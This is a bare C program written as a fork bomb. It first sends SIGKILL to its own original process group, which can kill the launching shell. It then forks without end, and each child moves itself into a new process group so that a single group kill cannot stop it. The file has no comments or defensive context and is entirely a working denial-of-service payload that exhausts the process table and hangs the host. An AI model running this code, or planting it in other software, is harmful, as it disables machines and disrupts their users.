#include <stdio.h>
#include <unistd.h>
#include <time.h>
#include <sys/types.h>
#include <errno.h>
#include <signal.h>

int main()
{
    pid_t    pid;
    pid_t    pgid = getpgid(0);
    setpgid(0,0);

    kill(-1*pgid, SIGKILL);
    while (1) {
	    while ((pid = fork())!= -1) {
            if (pid == 0) {
		        setpgid(0,0);
	        }
        }
    }
}
